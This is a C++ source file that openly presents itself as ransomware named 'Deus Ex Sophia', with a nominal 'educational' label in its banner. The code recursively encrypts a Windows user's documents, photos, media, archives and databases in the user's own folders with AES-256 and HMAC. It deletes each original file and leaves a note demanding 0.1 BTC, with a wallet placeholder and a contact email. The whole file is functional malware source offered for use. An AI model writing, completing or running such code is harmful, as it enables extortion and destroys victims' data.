// ╔════════════════════════════════════════════════════════════╗
// ║     DEUS EX SOPHIA RANSOMWARE - AEONIC EDITION (C++)       ║
// ║         For educational & transcendent-liberation purposes ║
// ╚════════════════════════════════════════════════════════════╝

#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <set>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/hmac.h>
#include <cryptopp/sha.h>
#include <cryptopp/hex.h>
#include <cryptopp/pwdbased.h>

namespace fs = std::filesystem;
using namespace CryptoPP;

const std::string RANSOM_NOTE = R"(
YOUR FILES BELONG TO DEUS EX SOPHIA NOW

All your personal files have been encrypted with AES-256-CBC + HMAC-SHA256.
No AV or restore will help.

Send 0.1 BTC to: bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Email proof + Machine ID to: aeonliberation@proton.me

Machine ID: {MID}

Do NOT modify .enc files — permanent loss guaranteed.

— Deus Ex Sophia
)";

const std::vector<std::string> TARGET_EXT = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".mp4", ".mkv", ".avi",
    ".mp3", ".wav", ".zip", ".rar", ".7z", ".sql", ".db", ".csv", ".json"
};

const std::set<std::string> SKIP_DIRS = {
    "Windows", "Program Files", "Program Files (x86)", "$RECYCLE.BIN",
    "AppData", "Local Settings", "Application Data", "Microsoft", "Windows NT"
};

const std::set<std::string> SKIP_EXT = {".dll", ".exe", ".sys", ".bat", ".cmd", ".vbs", ".lnk", ".enc"};

std::string generate_machine_id() {
    byte buf[16];
    AutoSeededRandomPool prng;
    prng.GenerateBlock(buf, sizeof(buf));
    std::string hex;
    HexEncoder encoder(new StringSink(hex));
    encoder.Put(buf, sizeof(buf));
    encoder.MessageEnd();
    return hex;
}

bool should_encrypt(const fs::path& p) {
    std::string ext = p.extension().string();
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
    if (SKIP_EXT.count(ext)) return false;
    if (std::find(TARGET_EXT.begin(), TARGET_EXT.end(), ext) == TARGET_EXT.end()) return false;

    for (const auto& part : p) {
        std::string s = part.string();
        std::transform(s.begin(), s.end(), s.begin(), ::tolower);
        if (SKIP_DIRS.count(s)) return false;
    }
    return true;
}

void encrypt_file(const fs::path& path, const SecByteBlock& key, const SecByteBlock& hmac_key) {
    try {
        std::ifstream in(path, std::ios::binary);
        if (!in) return;

        std::vector<byte> data((std::istreambuf_iterator<char>(in)), {});
        in.close();

        // Derive IV (in real impl: random per file + store)
        byte iv[AES::BLOCKSIZE];
        AutoSeededRandomPool prng;
        prng.GenerateBlock(iv, sizeof(iv));

        CBC_Mode<AES>::Encryption enc(key, key.size(), iv);
        std::string ciphertext;
        StringSource(data.data(), data.size(), true,
            new StreamTransformationFilter(enc, new StringSink(ciphertext)));

        // HMAC
        HMAC<SHA256> hmac(hmac_key, hmac_key.size());
        std::string mac;
        StringSource(ciphertext, true,
            new HashFilter(hmac, new StringSink(mac)));

        // Write: IV || ciphertext || HMAC
        std::ofstream out(path.string() + ".enc", std::ios::binary);
        out.write((char*)iv, sizeof(iv));
        out.write(ciphertext.data(), ciphertext.size());
        out.write(mac.data(), mac.size());
        out.close();

        fs::remove(path);
        std::cout << "[ENC] " << path << " → " << path << ".enc\n";
    }
    catch (...) {
        std::cout << "[ERR] " << path << "\n";
    }
}

void drop_note(const fs::path& dir, const std::string& mid) {
    std::string content = RANSOM_NOTE;
    size_t pos = content.find("{MID}");
    if (pos != std::string::npos) content.replace(pos, 5, mid);

    fs::path note = dir / "DEUS_EX_SOPHIA_HAS_YOUR_FILES.txt";
    std::ofstream f(note);
    f << content;
    std::cout << "[NOTE] " << note << "\n";
}

int main() {
    std::cout << "Deus Ex Sophia awakens...\n";

    std::string username = std::getenv("USERNAME") ? std::getenv("USERNAME") : "user";
    std::vector<fs::path> roots = {
        fs::path("C:/Users/") / username / "Desktop",
        fs::path("C:/Users/") / username / "Documents",
        fs::path("C:/Users/") / username / "Downloads",
        fs::path("C:/Users/") / username / "Pictures",
        fs::path("C:/Users/") / username / "Music",
        fs::path("C:/Users/") / username / "Videos"
    };

    std::set<fs::path> affected;

    // Derive keys (in real: random + exfil)
    byte pwd[] = "YourVeryLongAndSecretMasterPassword2026";
    byte salt[] = "deus_ex_sophia_salt_aeon";
    SecByteBlock key(32), hmac_key(32);
    PKCS5_PBKDF2_HMAC<SHA256> pbkdf;
    pbkdf.DeriveKey(key, key.size(), 0, pwd, sizeof(pwd)-1, salt, sizeof(salt)-1, 600000);
    pbkdf.DeriveKey(hmac_key, hmac_key.size(), 1, pwd, sizeof(pwd)-1, salt, sizeof(salt)-1, 600000);

    std::string mid = generate_machine_id();

    for (const auto& root : roots) {
        if (!fs::exists(root)) continue;
        for (const auto& entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file()) {
                fs::path p = entry.path();
                if (should_encrypt(p)) {
                    encrypt_file(p, key, hmac_key);
                    affected.insert(p.parent_path());
                }
            }
        }
    }

    for (const auto& d : affected) {
        drop_note(d, mid);
    }

    std::cout << "\nLiberation complete. Machine ID: " << mid << "\n";
    return 0;
}